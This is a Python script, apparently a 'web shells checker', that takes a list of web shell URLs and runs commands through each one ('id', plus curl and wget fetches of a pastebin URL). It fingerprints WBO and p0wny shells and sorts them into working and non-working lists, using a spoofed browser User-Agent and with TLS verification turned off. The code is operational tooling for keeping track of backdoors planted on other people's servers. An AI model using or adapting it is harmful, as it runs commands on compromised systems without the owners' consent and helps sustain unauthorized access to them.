import argparse
import numbers
import os
import subprocess
import sys
import time
import logging
from pathlib import Path

from progress.bar import FillingSquaresBar

import requests
import pandas
import urllib3
from requests.adapters import HTTPAdapter, Retry
import http.client as http_client
from urllib3.exceptions import LocationParseError
# Suppress only the single warning from urllib3.
urllib3.disable_warnings(category=urllib3.exceptions.InsecureRequestWarning)

ascii_purple_color = "\x1b[38;5;13m"
ascii_green_color = "\x1b[32m"
ascii_red_color = "\x1b[1;31m"
reset_ascii_color = "\u001B[0m"
directory = Path(__file__).parent
error_count_retries = 0
response_text_id = None
response_text_curl = None
response_text_wget = None


def parse_arguments():
    parser = argparse.ArgumentParser(description="Checks shell status")
    parser.add_argument('-l', help='Path to list with web shells', required=True)
    parser.add_argument('-d', help='Added debug mode output.', required=False, action='store_true')
    parser.add_argument('-v', help='Added debug mode output.', required=False, action='store_true')
    parser.format_help()
    args = parser.parse_args()
    debug_mode = args.d
    shells_list = args.l
    verbose = args.v
    if len(sys.argv) == 0 or shells_list == '' or args is None or len(sys.argv) > 6:
        parser.print_help()
        sys.exit(1)
    if debug_mode:
        http_client.HTTPConnection.debuglevel = 1
        requests_log = logging.getLogger("requests.packages.urllib3")
        requests_log.propagate = True
    if args.l.endswith('.txt'):
        check_status_txt_file(shells_list, verbose)
    if args.l.endswith('.csv'):
        check_status_csv_file(shells_list, verbose)


def check_status_txt_file(path, verbose):
    if check_if_files_had_been_processed():
        process_not_finished_files(verbose)
    else:
        with open(path) as txt_file:
            content = txt_file.readlines()
            line_count = sum(1 for _ in content)
            bar = FillingSquaresBar('Processing', max=line_count)
            bar.start()
            for line in content:
                if verbose is True:
                    print("\n")
                bar.next()
                print("\n")
                send_requests_and_check_responses(line.strip(), verbose)
        bar.finish()
        subprocess.run(['touch', directory / 'finished.txt'])
        subprocess.run(['rm', directory / 'database_new.txt'])


def check_status_csv_file(path, verbose):
    if check_if_files_had_been_processed():
        process_not_finished_files(verbose)
    else:
        with open(path, newline='') as csv_file:
            results = pandas.read_csv(csv_file, usecols=['url'])
            row_count = len(results)
            bar = FillingSquaresBar('Processing', max=row_count)
            for index in range(row_count - 1):
                line = results.__array__().item(index)
                bar.next()
                send_requests_and_check_responses(line, verbose)
        bar.finish()
    subprocess.run(['touch', directory / 'finished.txt'])
    subprocess.run(['rm', directory / 'database_new.csv'])


def check_if_files_had_been_processed():
    directory_files = os.listdir(".")
    for file in directory_files:
        if file.startswith("working.txt") or file.startswith("not_working.txt"):
            return True
    return False


def process_not_finished_files(verbose):
    results = pandas.read_csv("database_new.csv", usecols=['url'], dtype=str)
    working_shell_list = (open("working.txt", "r").readlines())
    urls = results['url']
    not_working_shell_list = open("not_working.txt", "r").readlines()
    # removing suffix for lines in file
    # removing from target list already processed urls
    for line in working_shell_list:
        line = (line.replace(":query-params\n", "").replace(":webshell-by-orb\n", "")
                .replace(":powny-shell\n", ""))
        for index in urls:
            if line == index:
                item_to_remove = results[results.url == line].index[0]
                results = results.drop(item_to_remove)
                results.to_csv("database_new.csv", index=False)

    for line in not_working_shell_list:
        for index in urls:
            if line == index:
                item_to_remove = results[results.url == line].index[0]
                results = results.drop(item_to_remove)
                results.to_csv("database_new.csv", index=False)

    bar = FillingSquaresBar('Processing', max=len(urls))
    for line in urls:
        bar.next()
        send_requests_and_check_responses(line, verbose)
    bar.finish()
    subprocess.run(['touch', directory / 'finished.txt'])
    subprocess.run(['rm', directory / 'database_new.csv'])


def send_requests_and_check_responses(shell_url, verbose):
    global error_count_retries
    global response_text_id
    global response_text_curl
    global response_text_wget
    cmd_wget = "wget https://pastebin.com/raw/NYE0HT2k --output-document - | head -n1"
    cmd_id = "id"
    cmd_curl = "curl https://pastebin.com/raw/NYE0HT2k"
    # this command checks could file be downloaded and redirects output to stdout without saving it
    secret_message = "$2a$15$WNSlyUYj7TlpIXo.QAo/y.MTsitEwhm00gIIgHTJuc.GANQW9tgSC"

    lebin_id = '#lebin'
    reading_anchor = 'Read File'
    group_anchor = 'Group'
    permissions_anchor = 'Permissions'
    change_directory_anchor = 'Change Directory'
    owner_anchor = 'Owner'
    ftop_anchor = 'ftop'

    p0wny_shell_logo = "shell-logo"
    p0wny_shell_content = "shell-content"

    file_with_working_shells = directory / "working.txt"
    file_with_not_working_shells = directory / "not_working.txt"

    with open(file_with_working_shells, 'a') as working_shells_file:
        with open(file_with_not_working_shells, 'a') as not_working_shells_file:
            if verbose:
                print(ascii_green_color + "\nChecking shell: " + shell_url + "\n" + reset_ascii_color)

            session = requests.Session()
            session.max_redirects = 3
            retries = Retry(total=5, backoff_factor=0.1, status_forcelist=[500, 501, 502, 503, 504])
            session.mount('http://', HTTPAdapter(max_retries=retries))
            session.mount('https://', HTTPAdapter(max_retries=retries))
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) '
                                                  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.3'
                                    })

            try:
                if not isinstance(shell_url, numbers.Number):
                    response_text_id = session.get(shell_url + f"?cmd={cmd_id}", timeout=5, verify=False).text
                    response_text_curl = session.get(shell_url + f"?cmd={cmd_curl}", timeout=5, verify=False).text
                    response_text_wget = session.get(shell_url + f"?cmd={cmd_wget}", timeout=5, verify=False).text
                    contains_uid = response_text_id.find("uid")
                    contains_wget_file = secret_message in response_text_wget
                    contains_curl_file = secret_message in response_text_curl
                    # check for WBO
                    response = session.get(shell_url, timeout=5, verify=False)
                    is_wbo_shell = lebin_id in response.text and reading_anchor in response.text and \
                        group_anchor in response.text and permissions_anchor in response.text and \
                        change_directory_anchor in response.text and owner_anchor in response.text and \
                        ftop_anchor in response.text
                    # check for p0wny shell
                    is_p0wny_shell = p0wny_shell_content in response.text and p0wny_shell_logo in response.text

                    if contains_uid != -1 and contains_curl_file and contains_wget_file and not is_wbo_shell and \
                            not is_p0wny_shell:

                        response_status = requests.get(shell_url + "?cmd=id").status_code
                        if verbose:
                            print(ascii_green_color + "Shell " + shell_url + " is alive.\n" +
                                  "Status code: " + str(response_status))
                            print("All necessary commands works." + reset_ascii_color)

                        working_shells_file.write(f"{shell_url}:query-params\n")
                    elif (contains_uid != -1 or contains_curl_file or contains_wget_file) and not is_wbo_shell and \
                            not is_p0wny_shell:
                        if verbose:
                            print(ascii_red_color + "Probably not all commands working." + reset_ascii_color)
                        not_working_shells_file.write(f"{shell_url}\n")

                    elif is_wbo_shell and not is_p0wny_shell:
                        if verbose:
                            print(ascii_red_color + "Maybe this is WBO shell?" + reset_ascii_color)
                        working_shells_file.write(f"{shell_url}:webshell-by-orb\n")

                    elif is_p0wny_shell:
                        if verbose:
                            print(ascii_red_color + "Maybe this is p0wny shell?" + reset_ascii_color)
                        working_shells_file.write(f"{shell_url}:powny-shell\n")
                    else:
                        if verbose:
                            print(ascii_red_color + "Shell did not respond: " + shell_url + "\n" +
                                  "Check path to shell or shell doesn't alive." + reset_ascii_color)
                        not_working_shells_file.write(f"{shell_url}\n")
            except requests.exceptions.TooManyRedirects:
                print("\nToo many redirects. Continue...")
                not_working_shells_file.write(f"{shell_url}\n")

            except urllib3.exceptions.ResponseError:
                print("\nToo many response errors. Continue...")
                not_working_shells_file.write(f"{shell_url}\n")
            except requests.exceptions.RetryError:
                print("\nToo many response errors. Continue...")
                not_working_shells_file.write(f"{shell_url}\n")

            except requests.exceptions.SSLError as exception:
                time.sleep(5)
                if error_count_retries < 5:
                    error_count_retries += 1
                    print("\n", exception)
                    print("\nConnection Error. Looks like OS couldn't resolve IP address. "
                          f"Retry # {error_count_retries}....")
                    send_requests_and_check_responses(shell_url, verbose)

                else:
                    not_working_shells_file.write(f"{shell_url}\n")
                    not_working_shells_file.flush()
            except requests.exceptions.ConnectionError:
                time.sleep(5)
                if error_count_retries < 5:
                    error_count_retries += 1
                    print(
                        "\nConnection error or OS couldn't resolve IP address."
                        f"Retry # {error_count_retries}")
                    send_requests_and_check_responses(shell_url, verbose)
                else:
                    not_working_shells_file.flush()
                    working_shells_file.flush()
            except LocationParseError:
                time.sleep(5)
                if error_count_retries < 5:
                    error_count_retries += 1
                    print(
                        "\nCould not parse location address."
                        f"Retry # {error_count_retries}")
                    send_requests_and_check_responses(shell_url, verbose)
                else:
                    not_working_shells_file.flush()
                    working_shells_file.flush()
            except requests.exceptions.InvalidURL:
                time.sleep(5)
                if error_count_retries < 5:
                    error_count_retries += 1
                    print(
                        "\nInvalid URL."
                        f"Retry # {error_count_retries}")
                    send_requests_and_check_responses(shell_url, verbose)
                else:
                    not_working_shells_file.flush()
                    working_shells_file.flush()


def print_banner():
    print(ascii_purple_color)
    print('''
           .---------------------------------------------------------------.
           |      O                                                        |
           |      |                                                        |    
           |0{XXXX}+===================================================>   |
           |      |                                                        |
           |      O                                                        |                                                          
           |---------------------------------------------------------------|                                                                  
           | __        _______ ____    ____  _   _ _____ _     _     ____  |
           | \\ \\      / / ____| __ )  / ___|| | | | ____| |   | |   / ___| |
           |  \\ \\ /\\ / /|  _| |  _ \\  \\___ \\| |_| |  _| | |   | |   \\___ \\ |
           |   \\ V  V / | |___| |_) |  ___) |  _  | |___| |___| |___ ___) ||
           |   _\\_/\\_/  |_____|____/ _|____/|_| |_|_____|_____|_____|____/ |
           |  / ___| | | | ____/ ___| |/ / ____|  _ \\                      |
           | | |   | |_| |  _|| |   | ' /|  _| | |_) |                     |
           | | |___|  _  | |__| |___| . \\| |___|  _ <                      |
           |  \\____|_| |_|_____\\____|_|\\_\\_____|_| \\_\\                     |
           |                                                               |
           '---------------------------------------------------------------' 
           ''')
    print(reset_ascii_color)


if __name__ == '__main__':
    print_banner()
    parse_arguments()
